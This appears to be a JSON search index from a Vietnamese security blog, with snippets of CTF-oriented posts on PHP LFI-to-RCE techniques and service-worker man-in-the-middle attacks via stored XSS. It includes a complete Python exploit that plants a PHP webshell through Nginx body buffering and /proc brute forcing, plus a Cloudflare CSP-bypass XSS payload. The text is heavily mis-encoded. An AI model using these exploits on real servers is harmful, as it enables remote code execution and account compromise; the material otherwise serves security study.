[ { "title": "C√°c kƒ© thu·∫≠t n√¢ng cao trong khai th√°c l·ªó h·ªïng PHP LFI2RCE", "url": "/posts/PHPLFI2RCE/", "categories": "WebSec, CTF", "tags": "rce, lfi", "date": "2022-05-22 20:10:00 +0700", "snippet": "C√°c kƒ© thu·∫≠t trong b√†i vi·∫øt ƒë·ªÅu c√≥ th·ªÉ gi√∫p khai th√°c l·ªói RCE nh∆∞ng c·∫ßn c√≥ s·ª± tr·ª£ gi√∫p c·ªßa LFI1. PHP Session File Upload Progress Exploitƒê·ªÉ th·ª±c hi·ªán ƒë∆∞·ª£c c√°ch khai th√°c n√†y ƒë√≤i h·ªèi m·ªôt v√†i c·∫•u h√¨nh c·ªßa php server, v√¨ v·∫≠y tr∆∞·ªõc ti√™n ta c·∫ßn t√¨m hi·ªÉu v·ªÅ c√°c thi·∫øt l·∫≠p m·∫∑c ƒë·ªãnh trong php.ini: session.upload_progress.enabled = on Khi tr√¨nh duy·ªát upload m·ªôt file l√™n server th√¨ php s·∫Ω l∆∞u th√¥ng tin chi ti·∫øt v·ªÅ file n√†y (ch·∫≥ng h·∫°n upload time, uploadprogress, ‚Ä¶) trong session. session.upload_progress.cleanup = on Sau khi file upload ho√†n th√†nh, session file s·∫Ω ngay l·∫≠p t·ª©c ƒë∆∞·ª£c x√≥a session.upload_progress.prefix = &quot;upload_progress_&quot; prefix d√πng v·ªõi upload progress key trong $SESSION. Key n√†y s·∫Ω ƒë∆∞·ª£c concatenated v·ªõi gi√° tr·ªã c·ªßa session.upload_progress.name ƒë·ªÉ cho ra m·ªôt index duy nh·∫•t. Gi√° tr·ªã m·∫∑c ƒë·ªãnh c·ªßa prefix l√†: ‚Äúupload_progress‚Äù session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot; When it appears in the form, php will report the upload progress. L·ª£i th·∫ø l·ªõn nh·∫•t c·ªßa ta ƒë√≥ l√† gi√° tr·ªã c·ªßa n√≥ c√≥ th·ªÉ ki·ªÉm so√°t ƒë∆∞·ª£c. session.auto_start=Off N·∫øu l√† On th√¨ php s·∫Ω t·ª± ƒë·ªông kh·ªüi t·∫°o session khi nh·∫≠n request v√† kh√¥ng c·∫ßn ph·∫£i th·ª±c thi session_start() session.use_strict_mode=0 Ta c√≥ th·ªÉ ki·ªÉm so√°t ƒë∆∞·ª£c sessionid trong cookie v√† server s·∫Ω t·∫°o session file t∆∞∆°ng ·ª©ng v·ªõi n√≥ ‚Äúsess_sessid‚Äù Session ƒë∆∞·ª£c b·∫Øt ƒë·∫ßu tr√™n php nh∆∞ th·∫ø n√†o?ƒê·ªÉ b·∫Øt ƒë·∫ßu m·ªôt PHP session th√¨ ta c·∫ßn h√†m session_start() ho·∫∑c thay ƒë·ªïi gi√° tr·ªã c·ªßa session.auto_start trong php.ini th√†nh ON ƒë·ªÉ auto session startNh∆∞ng gi√° tr·ªã m·∫∑c ƒë·ªãnh c·ªßa n√≥ l√† OFF v√¨ v·∫≠y kh√≥ c√≥ th·ªÉ khai th√°c l·ªói n√†y.Ta c√≥ th·ªÉ bypass ƒë∆∞·ª£c v·∫•n ƒë·ªÅ n√†y n·∫øu ta th√™m ‚ÄúPHP_SESSION_UPLOAD_PROGRESS‚Äù trong multipart POST data, PHP s·∫Ω enable session cho ch√∫ng ta.Session file ƒë∆∞·ª£c l∆∞u nh∆∞ th·∫ø n√†o ?C√°c file uploaded n√†y s·∫Ω ƒë∆∞·ª£c l∆∞u d·ª±a tr√™n session.save_path v√† gi√° tr·ªã n√†y th∆∞·ªùng s·∫Ω ƒë∆∞·ª£c thi·∫øt l·∫≠p m·∫∑c ƒë·ªãnh kh√°c nhau trong c√°c phi√™n b·∫£n c·ªßa phpc√≥ th·ªÉ l√† /tmp/sess_{sessionid} ho·∫∑c /var/lib/php/sessions/sess_{sessionid}L√†m sao ƒë·ªÉ bypass session_upload_progress.cleanup=ON?Nh∆∞ ƒë√£ n√≥i ·ªü tr√™n thi·∫øt l·∫≠p n√†y l√† m·∫∑c ƒë·ªãnh v√† n√≥ s·∫Ω x√≥a t·∫•t c·∫£ progress information ngay khi ho√†n th√†nh qu√° tr√¨nh ƒë·ªçc d·ªØ li·ªáu t·ª´ POST hay c√°c file session c·ªßa ta (ƒë∆∞·ª£c l∆∞u trong save_path) s·∫Ω ngay l·∫≠p t·ª©c b·ªã x√≥a.V√¨ th·∫ø ta c·∫ßn trigger race condition ƒë·ªÉ bypass v·∫•n ƒë·ªÅ n√†y. D∆∞·ªõi ƒë√¢y l√† c√°ch ƒë·ªÉ race: You can trigger the race condition by creating custom python script to brute force a session file uploaded, by including session file from local file inclusion vulnerability you found in victim site until the file is catched.(Extra: If you can see our previous demo, see the last curl on uploading session, I upload /etc/hostname as a file, you can upload large file to trying to slow down the victim site and (hanging) will result a fast race condition and it will be fast than upload small file).ƒê·ªÉ ƒë·ªçc n·ªôi dung c·ªßa file n√†y ta d√πng v√≤ng l·∫∑p:Ta th·∫•y r·∫±ng gi√° tr·ªã c·ªßa PHP_SESSION_UPLOAD_PROGRESS l√† Abusing PHP_SESION_UPLOAD_PROGRESS ƒë∆∞·ª£c l∆∞u v√†o file session v·∫≠y n·∫øu ta ch√®n m·ªôt ƒëo·∫°n m√£ php v√† include n√≥ th√¥ng qua LFI th√¨ ƒëi·ªÅu g√¨ s·∫Ω x·∫£y ra ? üòä =&amp;gt; RCEM·ªôt ƒëi·ªÅu c·∫ßn l∆∞u √Ω n·ªØa ·ªü kƒ© thu·∫≠t n√†y ƒë√≥ l√† file session s·∫Ω ch·ª©a nh·ªØng content r√°c n√™n ƒë√¥i khi kh√¥ng th√≠ch h·ª£p cho m·ªôt s·ªë tr∆∞·ªùng h·ª£p.Challenge: one-line-php (hitconctf2018)2. PHP Temporary File Upload ExploitPHP engine khi nh·∫≠n ƒë∆∞·ª£c m·ªôt packet POST s·∫Ω t·∫°o ra m·ªôt ho·∫∑c nhi·ªÅu c√°c temporary files ƒë·ªÉ l∆∞u c√°c uploaded file. PHP script x·ª≠ l√≠ c√°c file upload n√†y s·∫Ω d√πng move_uploaded_file() ƒë·ªÉ di chuy·ªÉn uploaded temporary file ƒë·∫øn v·ªã tr√≠ mong mu·ªën n·∫øu script c·∫ßn s·ª≠ d·ª•ng ƒë·∫øn file n√†y cho ƒë·∫øn khi ho√†n th√†nh c√¥ng vi·ªác. V√† khi script n√†y ho√†n th√†nh c√¥ng vi·ªác PHP engine s·∫Ω lo·∫°i b·ªè temporary files ·ª©ng v·ªõi files uploaded.H√¨nh sau l√† timeline c·ªßa qu√° tr√¨nh ƒë·ªÅ c·∫≠p ·ªü tr√™n:V√¨ th·∫ø ta c√≥ th·ªÉ upload m·ªôt PHP script v√† t·∫≠n d·ª•ng l·ªói LFI ƒë·ªÉ include temp file n√†y v√†o t·ª´ ƒë√≥ =&amp;gt; RCE üòäTin t·ªët ·ªü ƒë√¢y l√† PHP script th∆∞·ªùng s·∫Ω access ƒë·∫øn th∆∞ m·ª•c n∆°i m√† temporary files ƒë∆∞·ª£c t·∫°o. Th∆∞ m·ª•c m·∫∑c ƒë·ªãnh th∆∞·ªùng l√† /tmp tr√™n linux ho·∫∑c C:\\Windows\\Temp tr√™n windows.Tin x·∫•u l√† t√™n c·ªßa temp files n√†y l√† random üòû, ƒëi·ªÅu n√†y g√¢y ra s·ª± c·∫£n tr·ªü trong vi·ªác √°p d·ª•ng kƒ© thu·∫≠t n√†y. Tr√™n linux gi√° tr·ªã random n√†y l√† 6 k√≠ t·ª± (A-Za-z0-9) v√† ƒë∆∞·ª£c th√™m v√†o sau ‚Äú/tmp/php‚Äù prefix e.g /tmp/phpUsM123.B·∫•t l·ª£i ·ªü tr√™n d·∫´n ƒë·∫øn vi·ªác mu·ªën kh√°i th√°c l·ªó h·ªïng n√†y c·∫ßn th·ªèa c√°c gi·∫£ thuy·∫øt:B√™n c·∫°nh ƒë√≥ t√°c gi·∫£ c·ªßa b√†i nghi√™n c·ª©u v·ªÅ kƒ© thu·∫≠t n√†y c√≤n ƒë·ªÅ c·∫≠p v·ªÅ √Ω t∆∞·ªüng c·ªßa h·ªç:Hmmmm, chung quy l·∫°i th√¨ m·∫•u ch·ªët v·∫´n l√† ph·∫£i t√¨m ƒë∆∞·ª£c t√™n c·ªßa temp file.V√¥ t√¨nh l∆∞·ªõt qua m·ªôt b√†i vi·∫øt tr√™n hacktricks th√¨ h·ªç c√≥ ƒë·ªÅ c·∫≠p th√™m c√°c ƒëi·ªÅu ki·ªán ƒë·ªÉ h·ªó tr·ª£ khai th√°c cho l·ªói n√†y: LFI with PHPinfo assistance. To exploit this vulnerability you need: A LFI vulnerability, a page where phpinfo() is displayed, ‚Äúfile_uploads = on‚Äù and the server has to be able to write in the ‚Äú/tmp‚Äù directory.ƒê·∫°i kh√°i l√† s·∫Ω c√≥ m·ªôt trang display content c·ªßa phpinfo() t·ª´ ƒë√≥ ta c√≥ th·ªÉ leak ƒë∆∞·ª£c directory ƒë·∫øn temp file v·ª´a upload th√¥ng qua gi√° tr·ªã c·ªßa bi·∫øn $_FILES.B√™n c·∫°nh ƒë√≥ c√≤n m·ªôt kh√°i ni·ªám li√™n quan l√† PHP output buffering: PHP uses a buffer of 4096B and when it is full, it is send to the client. Then the client can send a lot of big requests (using big headers) uploading a php reverse shell, wait for the first part of the phpinfo() to be returned (where the name of the temporary file is) and try to access the temp file before the php server deletes the file exploiting a LFI vulnerability.C√≥ th·ªÉ hi·ªÉu PHP output buffering nh∆∞ sauChallenge: easy php (n1ctf2018)3. PHP LFI with Nginx AssistanceSection n√†y n√≥i v·ªÅ kƒ© thu·∫≠t khai th√°c c≈©ng d·ª±a tr√™n LFI nh∆∞ng ƒë·∫∑c bi·ªát h∆°n ·ªü ch·ªó PHP ƒë∆∞·ª£c k·∫øt h·ª£p v·ªõi Nginx server d∆∞·ªõi m·ªôt v√†i c·∫•u h√¨nh ƒë·∫∑c tr∆∞ng.C√°c kƒ© thu·∫≠t ƒë√£ n√≥i ·ªü tr√™n d·ªÅu d·ª±a v√†o vi·ªác th·ª±c hi·ªán LFI ƒë·ªëi v·ªõi session file ho·∫∑c temp file ƒë·ªÉ RCE. H√£y xem m·ªôt v√≠ d·ª• cho tr∆∞·ªùng h·ª£p c√°c tricks ·ªü tr√™n kh√¥ng th·ªÉ d√πng ƒë∆∞·ª£c:Source code:&amp;lt;?php include_once($_GET[&#39;file&#39;]);FPM / PHP config:php_admin_value[session.upload_progress.enabled] = 0php_admin_value[file_uploads] = 0V√† setup permission ƒë·ªÉ kh√¥ng th·ªÉ include file t·ª´ 2 folder n√†ychown -R 0:0 /tmp /var/tmp /var/lib/php/sessionschmod -R 000 /tmp /var/tmp /var/lib/php/sessionsMay m·∫Øn thay, PHP hi·ªán nay th∆∞·ªùng ƒë∆∞·ª£c deployed th√¥ng qua PHP-FPM v√† Nginx. Nginx cung c·∫•p m·ªôt c∆° ch·∫ø ƒë·ªÉ qu·∫£n l√≠ requests body size g·ªçi l√† client body buffering. N·∫øu client body l·ªõn h∆°n m·ªôt gi√° tr·ªã ƒë√£ c·∫•u h√¨nh tr∆∞·ªõc th√¨ s·∫Ω b·∫Øt ƒë·∫ßu t·∫°o ra temporary files v√† ghi v√†o ƒë√≥. V√† t√≠nh nƒÉng n√†y v√¥ t√¨nh l√†m cho LFI2RCE tr·ªü n√™n kh·∫£ thi üò¨.Temp file n√†y s·∫Ω ƒë∆∞·ª£c x√≥a ngay sau khi ƒë∆∞·ª£c x·ª≠ l√≠ b·ªüi Nginx. Nh∆∞ng ta c√≥ th·ªÉ l·ª£i d·ª•ng procfs ƒë·ªÉ tham chi·∫øu n√≥ th√¥ng qua race condition:/proc/34/fd:total 0lrwx------ 1 www-data www-data 64 Dec 25 23:56 0 -&amp;gt; /dev/pts/0lrwx------ 1 www-data www-data 64 Dec 25 23:56 1 -&amp;gt; /dev/pts/0lrwx------ 1 www-data www-data 64 Dec 25 23:49 10 -&amp;gt; anon_inode:[eventfd]lrwx------ 1 www-data www-data 64 Dec 25 23:49 11 -&amp;gt; socket:[27587]lrwx------ 1 www-data www-data 64 Dec 25 23:49 12 -&amp;gt; socket:[27589]lrwx------ 1 www-data www-data 64 Dec 25 23:56 13 -&amp;gt; socket:[44926]lrwx------ 1 www-data www-data 64 Dec 25 23:57 14 -&amp;gt; socket:[44927]lrwx------ 1 www-data www-data 64 Dec 25 23:58 15 -&amp;gt; /var/lib/nginx/body/0000001368 (deleted) One cannot directly include /proc/34/fd/15 in this example as PHP‚Äôs include function would resolve the path to /var/lib/nginx/body/0000001368 (deleted) which doesn‚Äôt exist in in the filesystem. This minor restriction can luckily be bypassed by some indirection like: /proc/self/fd/34/../../../34/fd/15 which will finally execute the content of the deleted /var/lib/nginx/body/0000001368 file.Challenge: a simple challenge for approach√Ä m·ªôt l∆∞u √Ω n·ªØa ƒë√≥ l√† c√°ch n√†y ch·ªâ d√πng ƒë∆∞·ª£c khi Nginx ch·∫°y v·ªõi c√πng user c·ªßa PHP (th∆∞·ªùng l√† www-data).L√≠ do th√¨ m√¨nh c√≥ mail h·ªèi t√°c gi·∫£ v√† h·ªç rep nh∆∞ sau:script exploit:#!/usr/bin/env python3import sys, threading, requests# exploit PHP local file inclusion (LFI) via nginx&#39;s client body buffering assistance# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for detailsURL = f&#39;http://{sys.argv[1]}:{sys.argv[2]}/&#39;# find nginx worker processes r = requests.get(URL, params={ &#39;file&#39;: &#39;/proc/cpuinfo&#39;})cpus = r.text.count(&#39;processor&#39;)r = requests.get(URL, params={ &#39;file&#39;: &#39;/proc/sys/kernel/pid_max&#39;})pid_max = int(r.text)print(f&#39;[*] cpus: {cpus}; pid_max: {pid_max}&#39;)nginx_workers = []for pid in range(pid_max): r = requests.get(URL, params={ &#39;file&#39;: f&#39;/proc/{pid}/cmdline&#39; }) if b&#39;nginx: worker process&#39; in r.content: print(f&#39;[*] nginx worker found: {pid}&#39;) nginx_workers.append(pid) if len(nginx_workers) &amp;gt;= cpus: breakdone = False# upload a big client body to force nginx to create a /var/lib/nginx/body/$Xdef uploader(): print(&#39;[+] starting uploader&#39;) while not done: requests.get(URL, data=&#39;&amp;lt;?php system($_GET[&quot;c&quot;]); /*&#39; + 16*1024*&#39;A&#39;)for _ in range(16): t = threading.Thread(target=uploader) t.start()# brute force nginx&#39;s fds to include body files via procfs# use ../../ to bypass include&#39;s readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`def bruter(pid): global done while not done: print(f&#39;[+] brute loop restarted: {pid}&#39;) for fd in range(4, 32): f = f&#39;/proc/self/fd/{pid}/../../../{pid}/fd/{fd}&#39; r = requests.get(URL, params={ &#39;file&#39;: f, &#39;c&#39;: f&#39;id&#39; }) if r.text: print(f&#39;[!] {f}: {r.text}&#39;) done = True exit()for pid in nginx_workers: a = threading.Thread(target=bruter, args=(pid, )) a.start()T√†i li·ªáu tham kh·∫£oLFI_With_PHPInfo_AssistanceWhat is PHP Output Buffering?PHP_LFI_rfc1867_temporary_filesFile Inclusion/Path traversal - HackTricksPHP LFI with Nginx Assistance" }, { "title": "Service worker v√† Man-in-the-Middle Attack", "url": "/posts/SWandMITM/", "categories": "WebSec, CTF", "tags": "xss, service worker", "date": "2022-05-10 23:43:00 +0700", "snippet": "Service worker v√† Man-in-the-Middle Attack, ƒë·ªÉ hi·ªÉu r√µ ƒë∆∞·ª£c v·ªÅ ch√∫ng th√¨ m√¨nh s·∫Ω chia ra t·ª´ng ch·ªß ƒë·ªÉ nh·ªè v√† cu·ªëi c√πng s·∫Ω m·ªôt challenge CTF t·ª´ nƒÉm 2021 ƒë·ªÉ minh h·ªça.Service worker (SW) l√† g√¨ ?Ho√†n c·∫£nh ra ƒë·ªùiC√°c tr√¨nh duy·ªát web s·ª≠ d·ª•ng Javascript nh∆∞ m·ªôt ng√¥n ng·ªØ ƒë·ªÉ x·ª≠ l√≠ c√°c ƒëo·∫°n code b√™n ph√≠a user, n·∫øu html l√† khung s∆∞·ªùn c·ªßa trang web, css gi√∫p t√¥ ƒëi·ªÉm cho trang web th√¨ JS g√≥p ph·∫ßn l√†m cho trang web tr·ªü n√™n sinh ƒë·ªông h∆°n, t∆∞∆°ng t√°c h∆°n v·ªõi user. Javascript l√† m·ªôt ‚Äúsingle threaded language‚Äù, c√≥ nghƒ©a l√† n√≥ th·ª±c thi c√°c ƒëo·∫°n code theo th·ª© t·ª± v√† ch·ªâ khi xong ƒëo·∫°n code ph√≠a tr∆∞·ªõc th√¨ m·ªõi ƒë·∫øn c√°i ti·∫øp theo.M·ªói tab trong m·ªôt tr√¨nh duy·ªát web s·∫Ω t∆∞∆°ng ·ª©ng v·ªõi m·ªôt JS thread. V√† b·ªüi v√¨ n√≥ l√† single thread n√™n n·∫øu c√°c t√°c v·ª• ph·∫£i x·ª≠ l√≠ qu√° nhi·ªÅu tr√™n m·ªôt thread nh∆∞ v·∫≠y s·∫Ω d·∫´n ƒë·∫øn thread n√†y b·ªã blocked v√† t·∫•t nhi√™n s·∫Ω l√†m ·∫£nh h∆∞·ªõng ƒë·∫øn perfomance c·ªßa trang web ƒë√≥. Service workers (SW) ra ƒë·ªùi ƒë√£ gi·∫£i quy·∫øt ƒë∆∞·ª£c v·∫•n ƒë·ªÅ n√†yService workerSW ch·ªâ ƒë∆°n gi·∫£n l√† m·ªôt t·ªáp JS. M·ªôt ƒëi·ªÉm ƒë·ªÉ ph√¢n bi·ªát gi·ªØa SW v√† m·ªôt file JS th√¥ng th∆∞·ªùng ƒë√≥ l√† SW th√¨ ch·∫°y trong n·ªÅn v√† ƒëi·ªÅu n√†y c≈©ng g√≥p ph·∫ßn l√†m gi·∫£m ƒëi c√°c t√°c v·ª• ph·∫£i x·ª≠ l√≠ cho JS thread ƒë√£ n√≥i ·ªü tr√™n. SW cung c·∫•p c√°c t√≠nh nƒÉng kh√¥ng y√™u c·∫ßu giao di·ªán ho·∫∑c t∆∞∆°ng t√°c v·ªõi ng∆∞·ªùi d√πng ch·∫≥ng h·∫°n nh∆∞ ƒë·ªìng b·ªô ng·∫ßm v√† push notifications ‚Ä¶SW ƒë√≥ng vai tr√≤ nh∆∞ m·ªôt proxy gi·ªØa web application v√† network, v√¨ th·∫ø m√† n√≥ c√≥ th·ªÉ intercept requests v√† x·ª≠ l√≠ ch√∫ng.service workerV√≤ng ƒë·ªùi c·ªßa service workerSW life cycleV√≤ng ƒë·ªùi c·ªßa m·ªôt service worker bao g·ªìm 3 giai ƒëo·∫°n ch√≠nh: Registration Installtion ActivationTr∆∞·ªõc khi b·∫Øt ƒë·∫ßu s·ª≠ d·ª•ng m·ªôt service worker ta ph·∫£i ƒëƒÉng k√≠ cho n√≥ nh∆∞ m·ªôt background process. ƒêo·∫°n code minh h·ªça cho vi·ªác ƒëƒÉng k√≠ m·ªôt SW:if (&#39;serviceWorker&#39; in navigator) { navigator.serviceWorker.register(&#39;/sw.js&#39;, { scope: &#39;/blog/&#39; }) .then(function (registration) { console.log(&#39;Service worker registered!&#39;); }) .catch(function (err) { console.log(&#39;Registration failed!&#39;); })}B·ªüi v√¨ kh√¥ng h·∫≥n l√† tr√¨nh duy·ªát n√†o c≈©ng h·ªó tr·ª£ SW n√™n ta s·∫Ω ph·∫£i ki·ªÉm tra trong if.B√™n c·∫°nh ƒë√≥ ta c≈©ng c√≥ th·ªÉ ch·ªâ ƒë·ªãnh scope cho n√≥. Scope l√† m·ªôt kh√°i ni·ªám quan tr·ªçng trong SW, n√≥ ch·ªâ ƒë·ªãnh path m√† SW n√†y s·∫Ω ho·∫°t ƒë·ªông. Trong v√≠ d·ª• tr√™n scope ƒë∆∞·ª£c set l√† /blog/ c√≥ nghƒ©a ta ƒë√£ gi·ªõi h·∫°n v√πng ho·∫°t ƒë·ªông c·ªßa SW ch·ªâ trong trong ph·∫°m vi c·ªßa th∆∞ m·ª•c /blog/.M·ªôt v√†i ƒëi·ªÅu c·∫ßn l∆∞u √Ω v·ªÅ giai ƒëo·∫°n n√†y nh∆∞ sau: SW mu·ªën ƒë∆∞·ª£c load th√¨ ph·∫£i th·ªèa m√£n t√≠nh ch·∫•t same origin. N·∫øu kh√¥ng c·∫•u h√¨nh scope th√¨ gi√° tr·ªã m·∫∑c ƒë·ªãnh c·ªßa n√≥ l√† ƒë∆∞·ªùng d·∫´n c·ªßa file JS trong register().Sau khi ho√†n th√†nh ƒëƒÉng k√≠, server s·∫Ω t·∫£i worker n√†y v√†o background. V√† ngay sau khi n√≥ ƒë∆∞·ª£c t·∫£i xu·ªëng, SW nh·∫≠n s·ª± ki·ªánactivate , th∆∞·ªùng c√°c l·∫≠p tr√¨nh vi√™n s·∫Ω d√πng n√≥ ƒë·ªÉ kh·ªüi t·∫°o c√°c file tƒ©nh v√†o trong cache. K·∫ø ƒë√≥, SW ti·∫øn v√†o trang th√°i idle v√† quy·∫øt ƒë·ªãnh tr·∫°ng th√°i k·∫ø ti·∫øp s·∫Ω l√† g√¨. Ho·∫∑c l√† s·∫Ω terminated ƒë·ªÖ ti·∫øt ki·ªám b·ªô nh·ªõ ho·∫∑c l√† s·∫Ω x·ª≠ l√≠ c√°c requests b·∫±ng s·ª± ki·ªán fetch/message. T·∫•t c·∫£ c√°c requests thu·ªôc ph·∫°m vi ƒë√£ c·∫•u h√¨nh trong scope s·∫Ω ƒë∆∞·ª£c x·ª≠ l√≠.Code minh h·ªça cho vi·ªác c·∫•u h√¨nh s·ª± ki·ªán fetch trong sw.js nh∆∞ sau:self.addEventListener(&#39;fetch&#39;, function (event) { event.respondWith(caches.match(event.request)) .then(function (response) { return response || fetch(event.request); });});N·∫øu m·ªôt SW ƒë∆∞·ª£c ƒëƒÉng k√≠ th√¨ trang web v·∫´n s·∫Ω ∆∞u ti√™n x·ª≠ d·ª•ng c√°i c≈© v√† ƒë∆∞a c√°i m·ªõi v√†o waiting sate. M·ªôt khi trang web ƒë√≥ng ho·∫∑c ƒë∆∞·ª£c reload th√¨ SW m·ªõi ƒë∆∞·ª£c n·∫°p v√†o s·ª≠ d·ª•ng.ƒêi·ªÉm n√†y n√™n ƒë∆∞·ª£c ch√∫ √Ω khi mu·ªën th·ª±c hi·ªán m·ªôt cu·ªôc t·∫•n c√¥ng Man-in-the-Middle Attack.Man-in-the-Middle Attack (MITM) l√† g√¨ ?H·ªìi x∆∞a khi ƒëi h·ªçc ch·∫Øc h·∫≥n ai c≈©ng ƒë√£ t·ª´ng nh·∫≠n v√† ƒë∆∞a th∆∞ gi√πm cho m·∫•y ƒë·ª©a trong l·ªõp ƒë√∫ng kh√¥ng. H·ªìi ƒë√≥ m√¨nh c√≤n ch·ªânh s·ª≠a l·∫°i th∆∞ c·ªßa ch√∫ng n√≥ c∆° üòú. Ki·ªÉu t·∫•n c√¥ng n√†y c≈©ng t∆∞∆°ng t·ª± d·ª±a tr√™n c√°i v√≠ d·ª• m√† m√¨nh ƒë∆∞a ra ƒë√≥. N√≥i m·ªôt c√°ch ‚Äúsecurity‚Äù h∆°n v·ªÅ kh√°i ni·ªám c·ªßa n√≥ th√¨ MITM l√† m·ªôt ki·ªÉu t·∫•n c√¥ng b√≠ m·∫≠t x·∫£y ra khi attacker nh·∫£y v√†o m·ªôt phi√™n giao ti·∫øp gi·ªØa user ho·∫∑c h·ªá th·ªëng. Attacker s·∫Ω m·∫°o danh c·∫£ hai b√™n v√† c√≥ ƒë∆∞·ª£c quy·ªÅn truy c·∫≠p v√†o th√¥ng tin m√† hai b√™n ƒëang c·ªë g·∫Øng g·ª≠i cho nhau. Attacker c√≥ th·ªÉ ch·∫∑n, g·ª≠i v√† nh·∫≠n d·ªØ li·ªáu d√†nh cho c·∫£ hai b√™n, m√† kh√¥ng c√≥ b√™n n√†o bi·∫øt cho ƒë·∫øn khi qu√° mu·ªôn.M·ªëi li√™n h·ªá gi·ªØa SW v√† MITMT·ªõi ƒë√¢y c√≥ th·ªÉ b·∫°n s·∫Ω th·∫Øc m·∫Øc ‚Äúth·∫ø th√¨ MITM li√™n quan c√°i qu√°i g√¨ ƒë·∫øn service worker ü§® ???‚ÄùM√¨nh s·∫Ω ƒë∆∞a ra m·ªôt v√≠ ƒë·ª• d∆°n gi·∫£n: Gi·∫£ s·ª≠ m·ªôt trang web b√°n h√†ng b·ªã l·ªói stored XSS ·ªü ph·∫ßn comment v√† c√≥ ch·ª©c nƒÉng upload file. User mu·ªën ƒë·ªçc tin t·ª©c v·ªÅ s·∫£n ph·∫©m hay mu·ªën xem profile c√° nh√¢n th√¨ c·∫ßn truy c·∫≠p t·ªõi http://shopping.com/products, http://shopping.com/profile. T√≠nh nƒÉng upload s·∫Ω l∆∞u file c·ªßa user t·∫°i ƒë∆∞·ªùng d·∫´n http://shopping.com/uploads/&amp;lt;filename&amp;gt;. Stored XSS x·∫£y ra ·ªü ph·∫ßn comment c·ªßa c√°c s·∫£n ph·∫©m.K·ªãch b·∫£n t·∫•n c√¥ng s·∫Ω nh∆∞ sau: Attacker s·∫Ω upload 1 file SW - sw.js. ·ªû ph·∫ßn comment c·ªßa s·∫£n ph·∫©m d√πng JS ƒë·ªÉ ƒëƒÉng k√≠ SW register(http://shopping.com/uploads/sw.js). Trong file sw.js n√†y c·∫•u h√¨nh scope: &#39;/&#39; v√† s·ª± ki·ªán fetch tr·∫£ v·ªÅ reponse YOU ARE HACKED.M·ªôt khi user ·∫•n v√†o ƒë·ªÉ xem comment c·ªßa s·∫£n ph·∫©m th√¨ v√¥ t√¨nh trigger ƒë·ªëng JS code -&amp;gt; register SW -&amp;gt; pwned. L√∫c n√†y khi user mu·ªën xem profile hay th√¥ng tin s·∫£n ph·∫©m th√¨ th·ª© hi·ªÉn th·ªã ch·ªâ l√† d√≤ng ch·ªØ YOU ARE HACKED c·ªßa attacker üòà.·ªû ƒë√¢y m√¨nh ch·ªâ ƒë∆∞a ra v√≠ d·ª• v·ªÅ ‚ÄúResponse modification‚Äù c√°c b·∫°n c√≥ th√™m xem th√™m t·∫°i ƒë√¢y.Qua v√≠ d·ª• ƒë∆°n gi·∫£n n√†y ta c√≥ th·ªÉ th·∫•y vi·ªác attacker l·ª£i d·ª•ng service woker, ho·∫°t ƒë·ªông nh∆∞ m·ªôt proxy, v√† k·∫øt h·ª£p v·ªõi MITM ƒë·ªÉ th·ª±c hi·ªán m·ªôt cu·ªôc t·∫•n c√¥ng ph√≠a ng∆∞·ªùi d√πng.blogme - corCTF2021Challenge n√†y l√† m·ªôt c√°ch ƒë·ªÉ th·ª±c t·∫ø h√≥a ƒë·ªëng l√≠ thuy·∫øt n√£y gi·ªù. M√¨nh c≈©ng s·∫Ω ti·∫øn h√†nh ph√¢n t√≠ch h∆∞·ªõng gi·∫£i quy·∫øt cho n√≥ d·ª±a tr√™n tinh th·∫ßn h·ªçc h·ªèi t·ª´ t√°c gi·∫£ l√† ch√≠nh.Source codehttps://github.com/strellic/my-ctf-challenges/tree/main/corCTF-2021OverviewoverviewTrang web hi·ªÉn th·ªã m·ªôt v√†i post c·ªßa admin v√† c√≥ c√°c ch·ª©c nƒÉng nh∆∞ Profile, Your Posts, Logout, Comment. Profile: t·∫°o post, upload image file v√† c√≥ th·ªÉ d√πng ƒë·ªÉ set avatar.profile Your Posts: hi·ªÉn th·ªã c√°c post ƒë√£ t·∫°o.your posts Comment: b√¨nh lu·∫≠n v·ªÅ m·ªôt post b·∫±ng c√°ch g·ª≠i data t·ªõi ../api/comment/&amp;lt;post id&amp;gt;.commentPh√¢n t√≠chHTML b·ªã escaped ·ªü t·∫•t c·∫£ c√°c ch·ªó ngo·∫°i tr·ª´ post page. Nh∆∞ng t√°c gi·∫£ c√≥ d√πng CSP:object-src &#39;none&#39;;script-src &#39;self&#39; &#39;unsafe-eval&#39;;V√† ·ªü post th·ª© 3 c·ªßa admin c≈©ng c√≥ ƒë·ªÉ g·ª£i √Ω:‚Äúwow, a lot of people have signed up and posted stuff! my bandwith was starting to get a little high, but Cloudflare (wink) (NOT SPONSORED) saved the day :D‚Äùƒê·ªÉ bypass th√¨ ta c√≥ th·ªÉ th·ª≠ tra ‚Äúcloudflare csp bypass unsafe-eval‚Äù, t√¨m ƒë∆∞·ª£c m·ªôt payload tr√™n tweet. Theo ƒë√≥, m√¨nh nh·∫≠n ra ƒë·ªÉ √°p d·ª•ng c√°ch n√†y th√¨ trang web ph·∫£i n·∫±m tr√™n m·ªôt cloudfare domain, v√¨ m√¨nh kh√¥ng c√≥ ƒëi·ªÅu ki·ªán mua domain üòÖ n√™n ch·∫Øc ch·ªâ d·ª´ng l·∫°i ·ªü m·ª©c ph√¢n t√≠ch th√¥i.post length b·ªã gi·ªõi h·∫°n ch·ªâ ƒë∆∞·ª£c max l√† 300 k√≠ t·ª± n√™n t√°c gi·∫£ ƒë√£ reconstruct l·∫°i payload:&amp;lt;form id=_cf_translation&amp;gt;&amp;lt;img id=lang-selector name=blobs&amp;gt;&amp;lt;output id=locale&amp;gt;&amp;lt;script&amp;gt;eval(name)&amp;lt;/script&amp;gt;&amp;lt;/output&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;a data-translate=value&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/zepto.min.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/cf.common.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=/cdn-cgi/scripts/cf.common.js&amp;gt;&amp;lt;/script&amp;gt;Nh·ªù v√†o eval(name) ta c√≥ th·ªÉ execute JS code ch√®n v√†o t·ª´ window.name.ƒêo·∫°n code x·ª≠ l√≠ file upload th·ª±c hi·ªán filter v√† ch·ªâ nh·∫≠n image 